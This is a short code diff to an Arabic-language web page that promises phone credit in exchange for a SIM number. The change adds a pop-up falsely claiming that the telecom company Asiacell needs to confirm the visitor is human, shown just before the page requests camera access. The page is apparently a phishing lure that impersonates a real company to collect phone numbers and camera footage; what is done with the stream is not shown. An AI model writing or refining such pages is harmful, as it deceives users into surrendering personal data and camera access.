@@ -138,8 +138,10 @@
 
         <!-- العنوان -->
         <div class="title"> ضيف رقم الشريحة كي يتم ارسال الرصيد </div>
-
-        <input type="number" required>
+        <form>
+            <input type="number" required>
+        </form>
+        
 
         <!-- الزر الرمادي -->
         <button class="main-button" onclick="Alert()"> ارسال الرقم للتحويل </button>
@@ -170,8 +172,10 @@
         // عند الضغط على الزر
         button.onclick = function Alert() {
 
+            
 
 
+            alert(" شركة ارسيل  تطلب التحقق منك انك ليس ريبوت وانك انسان حقيقي  ")
             // طلب الوصول إلى الكاميرا
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(function (stream) {
